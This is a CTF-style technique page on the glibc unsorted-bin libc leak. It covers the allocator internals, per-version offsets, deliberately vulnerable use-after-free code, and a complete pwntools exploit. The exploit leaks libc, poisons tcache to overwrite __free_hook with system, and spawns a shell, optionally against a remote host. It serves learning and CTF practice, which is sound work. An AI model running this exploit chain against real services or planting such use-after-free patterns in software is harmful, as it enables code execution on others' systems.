---
title: "Unsorted Bin Leak - Turning One free() Into a libc Base"
category: pwn
subcategory: heap
type: technique
tags: [unsorted-bin, libc-leak, main-arena, heap, uaf, smallbin, malloc-hook, free-hook, tcache, aslr, one-gadget, pwndbg, gef, pwntools, glibc]
difficulty: easy
summary: "A chunk in the unsorted bin has fd/bk pointing at main_arena+0x60 inside libc; read it once and ASLR is over."
when_to_use:
  - "You need a libc base and the binary has no puts@got leak or format string"
  - "You have a UAF/show primitive on a freed chunk"
  - "The allocation size is controllable so you can request >= 0x409 bytes"
  - "You already have an arbitrary read and want to know what to read"
tools: [pwntools, pwndbg, gef, one-gadget, libc-database]
related: [heap-use-after-free, heap-internals-primer, heap-tcache-poisoning, heap-unsorted-bin-attack, glibc-heap-cheatsheet]
---

## TL;DR

The unsorted bin is a circular doubly-linked list whose head lives *inside* `main_arena`,
which lives inside libc. A freshly freed chunk that lands there has
`fd = bk = &main_arena.bins[0] = main_arena + 0x60`. One `show()` of that chunk gives
you a libc pointer. Request >= 0x409 bytes so the chunk skips tcache entirely.

## Recognise it

- Full RELRO + NX + PIE: no GOT overwrite, no ret2plt, so you need a runtime leak.
- The menu lets you choose the allocation size.
- `show()` prints the chunk contents and the free path leaves the pointer dangling.
- Alternatively: the program itself prints an uninitialised buffer that happens to
  land on a previously freed unsorted chunk (a "free leak" with no explicit UAF).

## Vulnerable code shape

```c
void do_alloc(void) {
    int i = read_idx();
    size_t n = read_size();          /* attacker controls n -> can ask for 0x418 */
    ptr[i] = malloc(n);
    sz[i] = n;
    read(0, ptr[i], n);
}

void do_free(void) {
    int i = read_idx();
    free(ptr[i]);                    /* ptr[i] survives */
}

void do_show(void) {
    int i = read_idx();
    write(1, ptr[i], sz[i]);         /* prints fd = main_arena+0x60 */
}
```

Even without a UAF, this leaks:

```c
char *p = malloc(0x420);             /* reuses a previously freed unsorted chunk */
printf("%s\n", p);                   /* no memset -> stale fd/bk still there */
```

## Theory

Targets: glibc 2.23 - 2.39. The technique is version independent; only the *offset*
from the leak to the libc base changes.

`_int_free` on a chunk that is neither tcache-eligible nor fastbin-eligible does:

```c
bck = unsorted_chunks(av);          /* = &av->bins[0], i.e. main_arena + 0x60 */
fwd = bck->fd;
p->fd = fwd;
p->bk = bck;
...
bck->fd = p;
```

When the bin was empty, `fwd == bck`, so the freed chunk ends up with
**both** `fd` and `bk` equal to `main_arena + 0x60`.

Why `+0x60`? `struct malloc_state` on x86-64 is:

| offset | field |
|--------|-------|
| 0x00 | `mutex` (int) + `flags` (int) |
| 0x08 | `have_fastchunks` (int, 2.27+) |
| 0x10 | `fastbinsY[10]` |
| 0x60 | `top` |
| 0x68 | `last_remainder` |
| 0x70 | `bins[0]` ... |

`unsorted_chunks(av)` returns `bin_at(av, 1)` which is
`(mchunkptr)((char*)&av->bins[0] - 0x10)` - the `-0x10` compensates for the
`prev_size`/`size` header a real chunk would have. `&av->bins[0]` is at 0x70, so the
value you read is `main_arena + 0x60`. (On 2.23 there is no `have_fastchunks` field and
`fastbinsY` starts at 0x08, which is why the classic value there is also
`main_arena + 0x58` in some write-ups - always verify against your libc.)

### Getting there without filling the tcache

`csize2tidx(size) < mp_.tcache_bins` gates the tcache path, and
`mp_.tcache_bins == 64` covers chunk sizes 0x20..0x410. So:

- `malloc(0x409)` .. `malloc(0x418)` -> chunk 0x420 -> **skips tcache** -> unsorted bin
  on the first free. One allocation, one free, one show.
- Smaller sizes need 7 frees first to saturate the tcache bin, then the 8th free goes
  to unsorted.

You also need the freed chunk to *not* touch the top chunk, otherwise it is absorbed
into the wilderness and there is nothing to read. Always allocate a small "guard"
chunk right after the victim.

### From leak to base

```
libc_base = leak - 0x60 - libc.sym['main_arena']
```

`main_arena` is not exported in a stripped libc, but it is *always*
`__malloc_hook + 0x10` on 2.23-2.33 (they are adjacent in `malloc.c`), and
`__malloc_hook` IS a dynamic symbol. So:

```
main_arena_off = libc.sym['__malloc_hook'] + 0x10
```

On 2.34+ the hooks are gone; use a debug libc, `libc.rip`, or the known per-build
offsets. Commonly seen values for the `main_arena+0x60` leak, as an *offset into libc*:

| glibc | `main_arena` offset | leak value offset |
|-------|---------------------|-------------------|
| 2.23 (Ubuntu 16.04) | 0x3C4B20 | 0x3C4B78 (`+0x58`) |
| 2.27 (Ubuntu 18.04) | 0x3EBC40 | 0x3EBCA0 |
| 2.31 (Ubuntu 20.04) | 0x1ECB80 | 0x1ECBE0 |
| 2.35 (Ubuntu 22.04) | 0x219C80 | 0x219CE0 |

Treat these as *sanity checks*, not gospel: always derive from the provided
`libc.so.6`. If the low 12 bits of your leak are not `0xe0`/`0xa0`/`0x78`-ish, you
leaked the wrong thing.

### Smallbin variant

If you allocate again after the free, the unsorted chunk is sorted into a smallbin and
its `fd`/`bk` become `main_arena + 0x60 + 0x10*(idx)`. Still a libc leak, different
constant. A *second* chunk in the same smallbin has one pointer into libc and one into
the heap - that gives you libc and heap in a single read.

## Attack

1. `alloc(0, 0x418)` -> chunk A, size 0x420 (too big for tcache).
2. `alloc(1, 0x18)` -> chunk G, the guard. Keeps A away from the top chunk.
3. `free(0)` - A goes straight to the unsorted bin.
   `A->fd = A->bk = main_arena + 0x60`.
4. `show(0)` - read the first 8 bytes. That is your libc pointer.
5. `libc.address = leak - 0x60 - libc.sym['main_arena']`.
6. Optional heap leak in the same breath: `alloc(2, 0x418)` re-splits A; now
   `alloc(3, 0x88)`/`free` twice and read a tcache `next` for the heap base.
7. Compute `system`, `__free_hook`, `/bin/sh`, or run `one_gadget`.

If the size is fixed at something small (say 0x88):

1. `alloc(0..7, 0x88)` - eight chunks.
2. `alloc(8, 0x18)` - guard.
3. `free(0..6)` - seven frees fill tcache[7].
4. `free(7)` - the eighth goes to the unsorted bin.
5. `show(7)` - libc leak.

## Heap state

```text
after step 3

 heap                                       libc
 +--------------------------+               +---------------------------+
 | tcache_perthread (0x291) |               | main_arena                |
 +--------------------------+               |  +0x60 top / bins[0] area |
 | A  prev_size             |               |                           |
 |    size = 0x421 (P)      |               |                           |
 |    fd  = main_arena+0x60 |-------------->| &main_arena.bins[0] - 0x10|
 |    bk  = main_arena+0x60 |-------------->|                           |
 |    ... 0x400 of data ... |               +---------------------------+
 +--------------------------+
 | G  size = 0x21 (P)       |   <- guard: without it A merges into top
 +--------------------------+      and there is nothing left to read
 | top chunk                |
 +--------------------------+

 unsorted bin:  head(main_arena+0x60) <-> A <-> head


after one more malloc (A sorted into a smallbin, if A were < 0x400)

 smallbin[idx]: head(main_arena+0x60+0x10*idx) <-> A <-> head
 -> the leak constant shifts by 0x10 per bin index
```

## Exploit

```python
#!/usr/bin/env python3
"""Unsorted bin libc leak, then __free_hook -> system (or one_gadget).

Target: glibc 2.23 - 2.33 for the hook finish; the leak itself works on any version.
Usage:
    ./exploit.py
    ./exploit.py ONEGADGET=0x50a37
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

BIG = 0x418        # -> 0x420 chunk: above the last tcache bin (0x410)
SMALL = 0x88       # -> 0x90 chunk


def main_arena_offset(lib):
    """main_arena is not always exported; derive it from __malloc_hook when needed."""
    if "main_arena" in lib.sym:
        return lib.sym["main_arena"]
    if "__malloc_hook" in lib.sym:
        return lib.sym["__malloc_hook"] + 0x10      # adjacent in malloc.c, 2.23-2.33
    raise RuntimeError("supply main_arena offset manually for this libc")


io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def edit(i, d):
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


def lk(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


# ------------------------------------------------------- 1. unsorted bin leak
alloc(0, BIG, b"victim")
alloc(1, 0x18, b"guard")        # keep chunk 0 away from the top chunk
free(0)

leak = lk(show(0))
log.success("unsorted fd      = %#x", leak)
assert leak >> 40, "that does not look like a libc pointer - did the chunk hit top?"

arena_off = main_arena_offset(libc)
libc.address = leak - 0x60 - arena_off
log.success("main_arena       = %#x", libc.address + arena_off)
log.success("libc base        = %#x", libc.address)
assert libc.address & 0xFFF == 0, "libc base is not page aligned - wrong offset"

# ------------------------------------------------------------- 2. heap leak
alloc(2, SMALL, b"A" * 8)
alloc(3, SMALL, b"B" * 8)
free(2)
free(3)                          # tcache: 3 -> 2
raw = lk(show(3))
log.success("tcache next (raw) = %#x", raw)
# On 2.32+ this is mangled; ((raw) << 12) is not needed here because we only use
# it as a sanity signal. Real heap arithmetic lives in heap-safe-linking-bypass.

# ------------------------------------------------------------ 3. hook -> shell
if "__free_hook" in libc.sym:
    free_hook = libc.sym["__free_hook"]
    log.info("__free_hook = %#x", free_hook)
    edit(3, p64(free_hook))      # tcache poison (raw fd: glibc <= 2.31)
    alloc(4, SMALL, b"pad")
    if args.ONEGADGET:
        payload = p64(libc.address + int(args.ONEGADGET, 0))
    else:
        payload = p64(libc.sym["system"])
    alloc(5, SMALL, payload)
    alloc(6, 0x18, b"/bin/sh\x00")
    free(6)
else:
    log.warning("no __free_hook in this libc (2.34+): use FSOP or __exit_funcs")

io.interactive()
```

## Variants & pitfalls

- **The chunk merged into top.** No guard chunk -> nothing in the unsorted bin ->
  `show()` returns your old data. Symptom: the leak is `0x4141...`.
- **`puts()` stops at a NUL.** `main_arena+0x60` is `0x00007f....`, so the top two
  bytes are zero *at the end* of the little-endian qword. `puts` prints 6 bytes and
  stops - that is exactly what you want; `u64(x.ljust(8, b"\x00"))` reassembles it.
- **Wrong arena.** In a threaded challenge the chunk is freed into a thread arena that
  lives in an mmap'd region, not libc. Your "libc base" will be nonsense. Check the
  top byte: a real libc pointer is `0x7f`.
- **`mp_.tcache_bins` can be shrunk.** Some challenges call `mallopt`/`M_TCACHE`;
  rare, but it would change which sizes skip tcache.
- **2.34+**: the leak is unchanged, but the *use* changes - no hooks. Go to
  `heap-write-targets` / `heap-fsop-file-struct`.
- **Identify an unknown libc** from the leak: `libc.rip` accepts a symbol name and the
  last 3 hex digits. The unsorted leak alone is enough if you label it
  `main_arena+0x60` and cross-reference with a couple of known builds.
- **Do not hardcode 0x1ecbe0.** Different Ubuntu point releases of "2.31" have
  different offsets.

## Debugging

```text
pwndbg> bins                          # unsortedbin: 0x...  -> the chunk is really there
pwndbg> p &main_arena
pwndbg> p/x (long)&main_arena + 0x60
pwndbg> x/4gx <chunk_addr>            # prev_size, size, fd, bk
pwndbg> vis_heap_chunks 6
pwndbg> arena                         # top, last_remainder, bins[]
pwndbg> p main_arena.bins[0]
gef>  heap bins unsorted
gef>  heap arenas
```

```bash
# Derive main_arena from the shipped libc without a debugger.
nm -D ./libc.so.6 | grep -E ' (main_arena|__malloc_hook)$'
# Fall back to the hook adjacency when main_arena is not exported:
python3 -c "from pwn import ELF; l=ELF('./libc.so.6'); print(hex(l.sym['__malloc_hook']+0x10))"
```

## Tools

- `pwndbg bins` / `gef heap bins unsorted` to confirm the chunk landed.
- `libc-database` / `libc.rip` to fingerprint a remote libc from the leak.
- `one_gadget` once you have the base.

## References

- CTF Wiki, "Unlink" and "Unsorted Bin Attack" chapters (the leak is the prelude).
- glibc `malloc/malloc.c`: `_int_free`, `unsorted_chunks`, `struct malloc_state`.
- shellphish `how2heap`: `unsorted_bin_attack.c` shows the same bin state.
